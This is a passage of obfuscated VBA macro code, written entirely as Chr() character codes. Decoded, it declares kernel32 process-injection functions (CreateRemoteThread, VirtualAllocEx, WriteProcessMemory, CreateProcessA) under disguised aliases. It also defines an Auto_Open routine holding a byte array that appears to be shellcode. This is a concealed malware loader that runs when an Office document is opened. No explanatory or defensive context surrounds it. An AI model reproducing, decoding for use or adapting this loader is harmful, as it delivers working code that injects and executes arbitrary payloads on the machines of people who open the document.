Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(67)&Chr(111)&Chr(109)&Chr(109)&Chr(97)&Chr(110)&Chr(100)&Chr(76)&Chr(105)&Chr(110)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)& _
Chr(112)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)& _
Chr(101)&Chr(97)&Chr(100)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(98)&Chr(73)&Chr(110)&Chr(104)& _
Chr(101)&Chr(114)&Chr(105)&Chr(116)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(67)&Chr(114)&Chr(101)& _
Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(108)&Chr(97)&Chr(103)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)& _
Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(68)&Chr(105)&Chr(114)&Chr(101)&Chr(99)&Chr(116)&Chr(111)& _
Chr(114)&Chr(121)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(83)&Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(117)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)& _
Chr(84)&Chr(65)&Chr(82)&Chr(84)&Chr(85)&Chr(80)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)& _
Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(80)&Chr(82)&Chr(79)&Chr(67)&Chr(69)&Chr(83)&Chr(83)&Chr(95)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(82)&Chr(77)&Chr(65)&Chr(84)&Chr(73)&Chr(79)&Chr(78)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)& _
Chr(10)&Chr(35)&Chr(69)&Chr(108)&Chr(115)&Chr(101)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)& _
Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)&Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)& _
Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(82)&Chr(101)&Chr(109)&Chr(111)&Chr(116)&Chr(101)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)& _
Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)& _
Chr(100)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(83)&Chr(116)&Chr(97)& _
Chr(99)&Chr(107)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(83)&Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(65)&Chr(100)&Chr(100)& _
Chr(114)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(80)&Chr(97)&Chr(114)&Chr(97)&Chr(109)&Chr(101)&Chr(116)&Chr(101)&Chr(114)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)& _
Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(108)&Chr(97)&Chr(103)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)& _
Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(73)&Chr(68)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)& _
Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)& _
Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)&Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(86)&Chr(105)&Chr(114)&Chr(116)& _
Chr(117)&Chr(97)&Chr(108)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(69)&Chr(120)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)& _
Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(65)&Chr(100)&Chr(100)&Chr(114)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)& _
Chr(32)&Chr(108)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(102)&Chr(108)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(97)&Chr(116)&Chr(105)& _
Chr(111)&Chr(110)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(102)&Chr(108)&Chr(80)&Chr(114)&Chr(111)&Chr(116)&Chr(101)&Chr(99)&Chr(116)&Chr(32)& _
Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)& _
Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)& _
Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(77)&Chr(101)&Chr(109)&Chr(111)&Chr(114)& _
Chr(121)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)& _
Chr(108)&Chr(32)&Chr(108)&Chr(68)&Chr(101)&Chr(115)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(82)&Chr(101)&Chr(102)&Chr(32)&Chr(83)&Chr(111)&Chr(117)&Chr(114)&Chr(99)&Chr(101)&Chr(32)&Chr(65)&Chr(115)& _
Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(76)&Chr(101)&Chr(110)&Chr(103)&Chr(116)&Chr(104)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)& _
Chr(108)&Chr(32)&Chr(76)&Chr(101)&Chr(110)&Chr(103)&Chr(116)&Chr(104)&Chr(87)&Chr(114)&Chr(111)&Chr(116)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)& _
Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(82)&Chr(117)&Chr(110)&Chr(83)& _
Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)&Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)& _
Chr(101)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(65)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(65)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(78)& _
Chr(97)&Chr(109)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(67)&Chr(111)&Chr(109)&Chr(109)&Chr(97)&Chr(110)&Chr(100)&Chr(76)&Chr(105)& _
Chr(110)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)& _
Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)& _
Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(98)&Chr(73)&Chr(110)&Chr(104)&Chr(101)&Chr(114)&Chr(105)&Chr(116)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)& _
Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(108)&Chr(97)&Chr(103)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)& _
Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)& _
Chr(112)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(68)&Chr(114)&Chr(105)&Chr(101)&Chr(99)&Chr(116)&Chr(111)&Chr(114)&Chr(121)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(83)& _
Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(117)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(84)&Chr(65)&Chr(82)&Chr(84)&Chr(85)&Chr(80)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(80)&Chr(114)&Chr(111)& _
Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(80)&Chr(82)&Chr(79)&Chr(67)&Chr(69)&Chr(83)&Chr(83)&Chr(95)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(82)& _
Chr(77)&Chr(65)&Chr(84)&Chr(73)&Chr(79)&Chr(78)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(35)&Chr(69)&Chr(110)&Chr(100)&Chr(32)&Chr(73)&Chr(102)&Chr(10)&Chr(10)&Chr(83)&Chr(117)&Chr(98)&Chr(32)&Chr(65)&Chr(117)&Chr(116)& _
Chr(111)&Chr(95)&Chr(79)&Chr(112)&Chr(101)&Chr(110)&Chr(40)&Chr(41)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(109)&Chr(121)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)& _
Chr(32)&Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(86)&Chr(97)&Chr(114)&Chr(105)&Chr(97)&Chr(110)&Chr(116)&Chr(44)&Chr(32)&Chr(111)&Chr(102)&Chr(102)&Chr(115)&Chr(101)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)& _
Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(80)&Chr(82)&Chr(79)&Chr(67)&Chr(69)&Chr(83)&Chr(83)&Chr(95)&Chr(73)&Chr(78)&Chr(70)& _
Chr(79)&Chr(82)&Chr(77)&Chr(65)&Chr(84)&Chr(73)&Chr(79)&Chr(78)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(115)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(84)&Chr(65)&Chr(82)&Chr(84)&Chr(85)& _
Chr(80)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(115)&Chr(78)&Chr(117)&Chr(108)&Chr(108)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)& _
Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(115)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(10)&Chr(10)&Chr(35)&Chr(73)&Chr(102)&Chr(32)&Chr(86)&Chr(66)&Chr(65)&Chr(55)&Chr(32)& _
Chr(84)&Chr(104)&Chr(101)&Chr(110)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(114)&Chr(119)&Chr(120)&Chr(112)&Chr(97)&Chr(103)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(44)& _
Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(10)&Chr(35)&Chr(69)&Chr(108)&Chr(115)&Chr(101)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(114)&Chr(119)& _
Chr(120)&Chr(112)&Chr(97)&Chr(103)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(35)&Chr(69)&Chr(110)&Chr(100)&Chr(32)& _
Chr(73)&Chr(102)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(32)&Chr(61)&Chr(32)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(40)&Chr(45)&Chr(52)&Chr(44)&Chr(45)&Chr(50)&Chr(52)&Chr(44)&Chr(45)&Chr(49)& _
Chr(49)&Chr(57)&Chr(44)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(57)&Chr(54)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(57)&Chr(44)&Chr(45)&Chr(50)&Chr(55)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(45)&Chr(52)&Chr(54)&Chr(44)&Chr(49)&Chr(48)&Chr(48)&Chr(44)& _
Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(56)&Chr(50)&Chr(44)&Chr(52)&Chr(56)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(56)&Chr(50)&Chr(44)&Chr(49)&Chr(50)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(56)&Chr(50)&Chr(44)&Chr(50)&Chr(48)& _
Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(49)&Chr(49)&Chr(52)&Chr(44)&Chr(52)&Chr(48)&Chr(44)&Chr(49)&Chr(53)&Chr(44)&Chr(45)&Chr(55)&Chr(51)&Chr(44)&Chr(55)&Chr(52)&Chr(44)&Chr(51)&Chr(56)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(45)&Chr(49)&Chr(44)& _
Chr(52)&Chr(57)&Chr(44)&Chr(45)&Chr(54)&Chr(52)&Chr(44)&Chr(45)&Chr(56)&Chr(52)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(54)&Chr(48)&Chr(44)&Chr(57)&Chr(55)&Chr(44)&Chr(49)&Chr(50)&Chr(52)&Chr(44)&Chr(50)&Chr(44)&Chr(52)&Chr(52)&Chr(44)&Chr(51)&Chr(50)&Chr(44)& _
Chr(45)&Chr(54)&Chr(51)&Chr(44)&Chr(45)&Chr(52)&Chr(57)&Chr(44)&Chr(49)&Chr(51)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(53)&Chr(55)&Chr(44)&Chr(45)&Chr(51)&Chr(48)&Chr(44)&Chr(45)&Chr(49)&Chr(54)&Chr(44)&Chr(56)&Chr(50)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(45)& _
Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(56)&Chr(50)&Chr(44)&Chr(49)&Chr(54)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(54)&Chr(54)&Chr(44)&Chr(54)&Chr(48)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(56)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)& _
Chr(54)&Chr(52)&Chr(44)&Chr(49)&Chr(50)&Chr(48)&Chr(44)&Chr(45)&Chr(49)&Chr(50)&Chr(51)&Chr(44)&Chr(45)&Chr(54)&Chr(52)&Chr(44)&Chr(49)&Chr(49)&Chr(54)&Chr(44)&Chr(55)&Chr(52)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(56)&Chr(44)&Chr(32)&Chr(95)&Chr(10)& _
Chr(56)&Chr(48)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(55)&Chr(50)&Chr(44)&Chr(50)&Chr(52)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(51)&Chr(50)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(53)&Chr(44)&Chr(45)& _
Chr(50)&Chr(57)&Chr(44)&Chr(54)&Chr(48)&Chr(44)&Chr(55)&Chr(51)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(53)&Chr(50)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(50)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(45)& _
Chr(49)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(45)&Chr(54)&Chr(52)&Chr(44)&Chr(45)&Chr(56)&Chr(52)&Chr(44)&Chr(45)&Chr(54)&Chr(51)&Chr(44)&Chr(45)&Chr(52)&Chr(57)&Chr(44)&Chr(49)&Chr(51)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(53)&Chr(55)&Chr(44)&Chr(53)&Chr(54)& _
Chr(44)&Chr(45)&Chr(51)&Chr(50)&Chr(44)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(45)&Chr(49)&Chr(50)&Chr(44)&Chr(51)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(49)&Chr(50)&Chr(53)&Chr(44)&Chr(45)&Chr(56)&Chr(44)&Chr(53)&Chr(57)&Chr(44)&Chr(49)&Chr(50)&Chr(53)&Chr(44)& _
Chr(51)&Chr(54)&Chr(44)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(45)&Chr(51)&Chr(48)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(51)&Chr(54)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(53)&Chr(44)&Chr(49)& _
